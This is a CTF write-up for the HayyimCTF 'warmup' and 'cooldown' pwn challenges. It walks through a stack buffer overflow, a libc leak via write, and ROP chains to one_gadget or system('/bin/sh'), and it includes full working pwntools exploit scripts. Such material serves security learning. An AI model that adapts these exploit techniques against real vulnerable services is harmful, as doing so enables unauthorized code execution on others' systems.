---
title: "[pwn] warmup, cooldown"
categories:
  - CTF/pwn
tags:
  - bof
  - rop
---

HayyimCTF

# Warmup

we are provided source + stripped binary. chall [here](https://github.com/vietd0x/ctf-writeups/raw/main/Hayyim/Warmup.tgz) but you can get [libc, ld and patched bin](https://github.com/vietd0x/ctf-writeups/tree/main/Hayyim/warmup) to use for running on locally

```r
Arch:     amd64-64-little
RELRO:    Full RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE (0x400000)
```

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

void init() {
	setvbuf(stdin, NULL, _IONBF, 0);
	setvbuf(stdout, NULL, _IONBF, 0);
	setvbuf(stderr, NULL, _IONBF, 0);
}

void vuln() {
	char buf[0x30];
	memset(buf, 0, 0x30);
	write(1, "> ", 2);
	read(0, buf, 0xc0);
}

int main(void) {
	init();
	vuln();
	exit(0);
}
```

In `vuln` func, buf is reserve **0x30** bytes on stack, and read **0xc0** bytes ****from user input. Obiviously it’s BOF

We obtain very few gadgets, and no gadget of `rdi` register to control argument.

```c
vuln {
	push    rbx
	xor     eax, eax
	mov     ecx, 0xC
	lea     rsi, "> "
	mov     edx, 2          ; n
	sub     rsp, 0x30
	mov     rbx, rsp
	mov     rdi, rbx
	rep stosd
	mov     edi, 1          ; fd <-- we will ret here to dump info point by RSI
	call    _write

	mov     rsi, rbx        ; buf
	mov     edx, 0xC0       ; nbytes
	xor     edi, edi        ; fd = 0
	xor     eax, eax
	call    _read

	add     rsp, 0x30
	pop     rbx
	ret
```

This procedure looks weird w/o  appearance of `rbp` , and we have ST on .bss section

```r
pwndbg> x/10gx 0x601000 # .bss section
0x601000 <stdout>:      0x00007f45ac0316a0      0x0000000000000000
0x601010 <stdin>:       0x00007f45ac030980      0x0000000000000000
0x601020 <stderr>:      0x00007f45ac0315c0      0x0000000000000000
```

we will leak stderr and it’s already resolved for us

## Strategy

> leverage **rbx** to control **rsi** before call write for dump things to leak
> 

Using bof to control `rbx` pointer to `<stderr-8>`, then ret back to write, afer that change `rsi = <stderr-8>` and call `read` funct, we just input 8 bytes then ret2 write funct again for write(1, `<stderr-8>`, 0xc0) to leak stderr addr.

```c
	mov     edi, 1          ; fd <-- we will ret here to dump info point by RSI
	call    _write

	mov     rsi, rbx        ; rsi = <stderr-8>
	mov     edx, 0xC0       ; nbytes
	xor     edi, edi        ; fd = 0
	xor     eax, eax
	call    _read

	add     rsp, 0x30
	pop     rbx
	ret
```

## Poc

```python
#!/usr/bin/env python3
from pwn import *

def start(argv=[], *a, **kw):
  return process([exe] + argv, *a, **kw)

gs = '''
init-pwndbg
b *0x40057D
continue
'''.format(**locals())

exe = './warmup'
elf = context.binary = ELF(exe, checksec=False)
libc = ELF('./libc-2.27.so', checksec=False)
context.log_level = 'info'

# on .bss section
_8bytes_before_srderr = 0x601018 
f_write = 0x40055d

io = start()

payload = flat({
  0x30: [
    _8bytes_before_srderr,  # pop rbx
    f_write,                # ret
    # need it to control rip in second read
    # because 'add rsp, 0x30'
    b'\x00'*0x30,  # need set envp = 0 before call execve due to use one_gadget later

    _8bytes_before_srderr,  # pop rbx
    f_write,    # ret

    b'A'*0x30,  # due to add rsp, 0x30
    0,          # pop rbx
    0x40053d,   # ret to vuln func
  ]
})

io.sendafter(b'> ', payload)
io.send(b'V'*8)

io.recvuntil(b'VVVVVVVV')
libc.address = u64(io.recv(6).ljust(8, b'\x00')) - libc.symbols['_IO_2_1_stderr_']
log.success(f'libc base = 0x{libc.address:0x}')

io.send(b'V'*8)
# bof with one_gadget
io.sendafter(b'> ', b'A'*0x38 + p64(libc.address + 0x4f432) + p64(0)*10)
# p64(0)*10 to set argv = 0 before call excecve
io.interactive()
```

# Cooldown

Warmup & [cooldown](https://github.com/vietd0x/ctf-writeups/raw/main/Hayyim/Cooldown_15.tgz) are the same problem, only differing by size of input buffer, 0x60 bytes instead of 0xc0 bytes. Actually if your script work on cooldown chall, it’s also work on warmup chall. But my script before didn’t work cause my payload i send to long, so i must approad diff way to solve this chall.

```c
void vuln() {
	char buf[0x30];
	memset(buf, 0, 0x30);
	write(1, "> ", 2);
	read(0, buf, 0x60);
}
```

## strategy

like `warmup`, use write to leak libc

```c
► 0x400573    call   read@plt // break point at read
        fd: 0x0 (/dev/pts/0)
        buf: 0x7fffffff7cd8 ◂— 0x0
        nbytes: 0x60
pwndbg> tel 10
00:0000│ rbx rsi rsp 0x7fffffff7cd8 ◂— 0x0
... ↓                6 skipped
07:0038│             0x7fffffff7d10 —▸ 0x4004f2 ◂— xor    edi, edi // ret addr turn back to main
08:0040│             0x7fffffff7d18 —▸ 0x7ffff7dd40ca ◂— lea    rdx, [rip + 0xfa6f] // <_dl_start_user+50> ret addr of main
pwndbg> x/3i 0x7ffff7dd40ca
   0x7ffff7dd40ca:      lea    rdx,[rip+0xfa6f] # 0x7ffff7de3b40 //<_dl_fini>
   0x7ffff7dd40d1:      mov    rsp,r13
   0x7ffff7dd40d4:      jmp    r12
pwndbg> x $r12
   0x4004e0:    sub    rsp,0x8 // addr of main
// we have free roundtrip
```

So, if i overwrite ret addr with `elf.plt.write`, it become

```r
elf.plt.write
<_dl_start_user+50>
```

After call `write`, it jmp to run code in `<_dl_start_user+50>` and we turn back to main

**NOTE:** not working on local, need run docker, because we call `write(0, buf, 0x60)` to dump stack

## Poc1

```python
#!/usr/bin/env python3
from pwn import *

def start(argv=[], *a, **kw):
  if args.REMOTE:
    return remote('localhost', 10005, *a, **kw)
  else:
    return process([exe] + argv, *a, **kw)
   
gs = '''
init-pwndbg
b *0x40057d
continue
'''

exe = './Cooldown_patched'
elf = context.binary = ELF(exe, checksec=False)
libc = ELF('./libc.so.6', checksec=False)
context.log_level = 'debug'

io = start()

payload = flat({
  0x38:[
    # to leak libc with write(0, input_buf, 0x60)
    elf.plt.write,   # vuln ret
  ]
})
io.sendafter(b'> ', payload)
io.recvuntil(b'naaa')
# use vmmap to calc offset val
libc.address = u64(io.recv(16)[-8:]) - 0x3F20CA
log.success(f'libc base = 0x{libc.address:0x}')

pop_rdi = libc.search(asm('pop rdi; ret')).__next__()
payload = flat({
  0x38:[
    pop_rdi,
    libc.search(b'/bin/sh').__next__(),
    libc.sym.system, 
  ]
})
io.sendafter(b'> ',payload)
io.interactive()
```